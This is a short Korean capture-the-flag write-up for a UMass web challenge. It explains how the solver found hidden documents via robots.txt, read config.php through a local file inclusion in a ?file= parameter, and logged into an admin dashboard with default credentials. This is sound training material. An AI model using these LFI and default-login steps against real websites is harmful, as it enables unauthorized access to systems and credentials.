# 문제명

## 문제 설명

> I found this old portal for BrickWorks Co. They say their internal systems are secure, but I'm not so sure. Can you find the hidden admin dashboard and get the flag?


- http://brick-by-brick.web.ctf.umasscybersec.org

## 풀이

### 분석

무작정 /admin 해서 404 확인 후 /robot.txt 를 확인함. /robots.txt에는 /internal-docs/ 경로 아래의 문서들(assembly-guide.txt, it-onboarding.txt, q3-report.txt)이 숨겨저 있었고, 해당 문서들에 접근하여 웹 구조 파악. IT onboarding.txt에서 ?file= 파라미터를 통해 파일을 읽을 수 있다는 것과, config.php 파일에 관리자 정보가 저장되어 있음을 확인.

### 취약점

Local File Inclusion (LFI): ?file= 파라미터를 통해 서버 내부 파일을 읽을 수 있음
Information Disclosure: config.php 파일이 외부에서 접근 가능하여 내부 설정 및 관리자 정보 노출
Default Credentials 사용: 관리자 계정이 기본 비밀번호를 그대로 사용

### 익스플로잇

1. robots.txt 확인
    /internal-docs/assembly-guide.txt
    /internal-docs/it-onboarding.txt
    /internal-docs/q3-report.txt

2. 내부 문서 확인
    http://brick-by-brick.web.ctf.umasscybersec.org/internal-docs/it-onboarding.txt
    ->?file= 파라미터, config.php
3. LFI를 이용한 config.php 읽기
    http://brick-by-brick.web.ctf.umasscybersec.org/?file=config.php
    ->admin 페이지 위치(/dashboard-admin.php), Change 'administrator' account from default password. 확인
4. admin 페이지 접속 후 로그인 시도
    http://brick-by-brick.web.ctf.umasscybersec.org/dashboard-admin.php
    USERNAME: administrator, PASSWORD: administrator
